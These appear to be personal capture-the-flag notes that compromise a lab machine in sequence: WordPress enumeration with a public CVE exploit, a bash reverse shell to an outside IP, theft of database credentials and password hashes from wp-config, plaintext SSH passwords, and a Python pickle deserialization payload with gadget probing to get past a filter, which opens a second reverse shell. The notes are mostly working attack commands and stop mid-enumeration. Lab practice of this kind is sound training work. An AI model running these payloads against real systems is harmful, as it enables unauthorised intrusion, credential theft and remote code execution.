open ports
22 
norm:N0rm_th3_r0b0t_2026
80 => wordpress 6.9 - CVE-2026-63030 (routing confusion) and CVE-2026-60137 (SQL injection). 


gobuster dir -u http://10.49.158.220 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.158.220
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 319] [--> http://10.49.158.220/wp-content/]
wp-includes          (Status: 301) [Size: 320] [--> http://10.49.158.220/wp-includes/]
wp-admin             (Status: 301) [Size: 317] [--> http://10.49.158.220/wp-admin/]

===============================================================
Finished
===============================================================

Exploit that worked: https://github.com/mhtsec/CVE-2026-63030.git

`python3 exp.py --url http://10.49.158.220 --command "bash -c 'bash -i >& /dev/tcp/192.168.143.123/4444 0>&1'"`

 `cat /var/www/html/wp-config.php 2>/dev/null`
'DB_USER', 'wpuser' 
'DB_PASSWORD', 'wp_WjURfdI'
'DB_HOST', 'localhost'

`mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT ID, user_login, user_pass, user_email FROM wp_users;"`
<, user_login, user_pass, user_email FROM wp_users;"
ID	user_login	user_pass	user_email
1	heinz	$wp$2y$10$.BrQfOVjT99Dym42SPtG..4JAENmluiY0CXlu/z6EnJMkizaze4ZW	heinz@evilinc.example


`mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT * from wp_infra_accounts;"`

ssh into norm - grab user.txt in the home dir

mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT * from wp_infra_accounts;"
<dI' wordpress -e "SELECT * from wp_infra_accounts;"
host_user	host_pass	note
norm	N0rm_th3_r0b0t_2026	
this note:  **ssh sync target for the -inator newsletter cron**

grep -rln "operator\|token\|secret\|8700\|blueprint" /home /etc /opt /srv /var/www /var/local /var/lib 2>/dev/null | grep -v -E "proc|sys|snap|dist-packages|site-packages"

cat /etc/evilinc/panel.conf 
[panel]
operator_secret = b3hind_sch3dul3_th1s_m0nth

curl -si -X POST http://127.0.0.1:8700/api/login -d "secret=b3hind_sch3dul3_th1s_m0nth"
op_token=<a_value>

cat > /tmp/p.py << 'EOF'
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/YOUR_IP/5555 0>&1'",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
EOF

nc -lvnp 5555

==cat > /tmp/probe2.py << 'EOF'==
==import pickle, base64, sys==

==probes = {==
    =="pty.spawn":       (__import__('pty').spawn, (["true"],)),==
    =="pydoc.pipepager": (__import__('pydoc').pipepager, ("id", "cat")),==
    =="pydoc.pager":     (__import__('pydoc').pager, ("id",)),==
    =="timeit.timeit":   (__import__('timeit').timeit, ("1",)),==
    =="ctypes.CDLL":     (__import__('ctypes').CDLL, (None,)),==
    =="code.interact":   (__import__('code').interact, ()),==
    =="runpy.run_path":  (__import__('runpy').run_path, ("/tmp/x.py",)),==
==}==

==target = sys.argv[1]==
==callable_, args = probes[target]==
==class R:==
    ==def __reduce__(self):==
        ==return (callable_, args)==
==print(base64.b64encode(pickle.dumps(R())).decode())==
==EOF==

==for probe in "pty.spawn" "pydoc.pipepager" "pydoc.pager" "timeit.timeit" "ctypes.CDLL" "code.interact" "runpy.run_path"; do==
  ==echo "=== $probe ="==
  ==P=$(python3 /tmp/probe2.py "$probe")==
  ==curl -s -b "op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9" \==
    ==-X POST http://127.0.0.1:8700/api/blueprints/import \==
    ==--data-urlencode "blueprint=$P"==
  ==echo==
==done==


PAYLOAD=$(python3 -c '
import pickle, base64, pydoc
class RCE:
    def __reduce__(self):
        return (pydoc.pipepager, ("", "bash -c \"bash -i >& /dev/tcp/192.168.143.123/5555 0>&1\""))
print(base64.b64encode(pickle.dumps(RCE())).decode())
')
echo "$PAYLOAD"

curl -s -b "op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9" \
  -X POST http://127.0.0.1:8700/api/blueprints/import \
  --data-urlencode "blueprint=$PAYLOAD"


 cat /home/vanessa/*.txt 2>/dev/null

2nd flag - operator flag.


grep -rn "tasking.sock\|evilinc\|exec|\|POLL\|VERB" /var/www /home /opt /srv /etc 2>/dev/null | grep -v -E "Binary|dist-packages|site-packages|node_modules"

But wait — `vanessa` is in the **`evilinc` group**, and the **systemd unit files** are readable:

text

/etc/systemd/system/evilinc-c2.service
/etc/systemd/system/evilinc-heartbeat.service
/etc/systemd/system/evilinc-implant.service

